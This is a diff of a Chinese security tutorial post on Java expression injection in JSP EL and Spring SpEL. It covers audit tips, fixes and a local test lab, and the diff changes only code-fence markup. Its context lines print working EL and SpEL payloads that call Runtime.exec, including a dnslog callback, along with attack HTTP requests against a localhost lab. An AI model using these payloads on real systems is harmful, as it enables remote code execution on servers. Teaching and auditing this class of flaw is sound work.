@@ -7,19 +7,19 @@ tags: [表达式注入, spel, ognl, 注入, el]
 
 ## <font style="color:rgb(0, 0, 0);">1.漏洞成因</font>
 
-```plain
+```
 Java中表达式根据框架分为许多种,常见的就是JSP-JSTL_EL、Spring SpEL等...
 在不同的环境下的程序可能使用了不同的表达式解析,在使用或是配置有误的情况下,将导致任意表达式执行
 ```
 
 ## 2.审计策略
 
-```plain
+```
 JSP-JSTL_EL:
 查看JSP视图文件是否外部可控
 ```
 
-```plain
+```
 Spring SpEL:
 jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 搜索,parseExpression(...),查看参数一是否外部可控
@@ -27,20 +27,20 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 
 ## 3.修复方法
 
-```plain
+```
 代码中避免外部可控,如果实在需要外部可控,也需要过滤好才能带入到表达式中执行,防止恶意解析
 ```
 
 ## 4.例子
 ## 0x04.1 概述
 
-```plain
+```
 本示例列举了Java代码审计中最基础的表达式注入环境,读者们可以根据示例来学习该漏洞,并进行举一反三
 ```
 
 ## 0x04.2 测试环境目录
 
-```plain
+```
 // 目录结构
 ├── src
 │ ├── main
@@ -65,7 +65,7 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 
 ## 0x04.3 JSP-JSTL_EL
 
-```plain
+```
 注意:
 在现在实际场景中
 一般是没法直接从外部控制JSP页面中的EL表达式的,而目前已知的EL表达式注入漏洞
@@ -75,7 +75,7 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 
 ### 0x04.3.1 基础操作入门
 
-```plain
+```
 路径: Java安全慢游记->Java Web基础->Java Server Pages->JSP EL表达式语言
 链接: https://www.yuque.com/pmiaowu/gpy1q8/ele2kl
 
@@ -85,7 +85,7 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 
 ### 0x04.3.2 常用POC
 
-```plain
+```
 // 对应于JSP页面中的pageContext对象
 ${pageContext}
 
@@ -110,7 +110,7 @@ ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEng
 
 ### 0x04.3.3 测试环境搭建
 
-```plain
+```
 <!-- 第一步 -->
 <!-- 路径: ./SpringMVCTest2/src/main/webapp/expression/JSTL_EL_TEST.jsp -->
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
@@ -161,7 +161,7 @@ public class JspJstlEl {
 ![pasted image 20260618084546](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084546.png)
 
 
-```plain
+```
 // 第一步
 // 修改模版文件内容为恶意的
 POST /SpringMVCTest2_war/JSP_JSTl_El/saveView HTTP/1.1
@@ -177,7 +177,7 @@ data=${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()
 
 
 
-```plain
+```
 // 第二步
 // 访问视图文件,触发dnslog,通过dnslog确认漏洞
 GET /SpringMVCTest2_war/expression/JSTL_EL_TEST.jsp HTTP/1.1
@@ -193,14 +193,14 @@ Connection: close
 ## 0x04.4 Spring SpEL
 ### 0x04.4.1 基础操作入门
 
-```plain
+```
 路径: Java安全慢游记->Java Web基础->Spring->Spring SpEL
 链接: https://www.yuque.com/pmiaowu/gpy1q8/doc14tgd5x5zc15p
 ```
 
 ### 0x04.4.2 常用POC
 
-```plain
+```
 POC格式:
 #{exp}或是exp
 
@@ -209,7 +209,7 @@ POC格式:
 区别不大,根据代码选择exp即可,后面会有案例
 ```
 
-```plain
+```
 测试是否有表达式注入-1:
 aaaa#{12*12}fffff 响应包返回,aaaa144fffff,表示有表达式注入
 
@@ -269,7 +269,7 @@ public class SpEL {
 ### 0x04.4.4 漏洞测试
 #### 0x04.4.4.1 test路由
 
-```plain
+```
 // test路由,漏洞测试数据包,测试漏洞是否存在
 POST /SpringMVCTest2_war/SpEL/test HTTP/1.1
 Host: 127.0.0.1:8081
@@ -284,7 +284,7 @@ s=new String('hello world').toUpperCase()
 
 
 
-```plain
+```
 // test路由,漏洞测试数据包,命令执行测试
 POST /SpringMVCTest2_war/SpEL/test HTTP/1.1
 Host: 127.0.0.1:8081
@@ -299,7 +299,7 @@ s=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInpu
 
 #### 0x04.4.4.2 test2路由
 
-```plain
+```
 // test2路由,漏洞测试数据包,测试漏洞是否存在
 POST /SpringMVCTest2_war/SpEL/test2 HTTP/1.1
 Host: 127.0.0.1:8081
@@ -312,7 +312,7 @@ s=aaaa#{12*12}fffff
 
 ![pasted image 20260618084636](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084636.png)
 
-```plain
+```
 // test2路由,漏洞测试数据包,命令执行测试
 POST /SpringMVCTest2_war/SpEL/test2 HTTP/1.1
 Host: 127.0.0.1:8081
